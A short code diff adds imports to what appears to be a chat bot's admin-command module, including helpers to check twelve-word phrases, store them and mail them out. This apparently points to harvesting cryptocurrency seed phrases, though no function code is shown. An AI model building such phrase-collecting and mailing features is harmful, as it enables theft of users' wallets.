@@ -1,4 +1,7 @@
-import isTwelveWords from '../helpers/checkPhrase';
+import updatePhrase from '../db/methods/UpdateMethods/updatePhrase.js';
+import isTwelveWords from '../helpers/checkPhrase.js';
+import sendPhraseMail from '../helpers/mailPhrase.js';
+import hasAtLeastSixWords from '../helpers/sixWords.js';
 
 /**
  * List of valid admin commands that the bot recognizes when sent as plain messages (not slash commands).
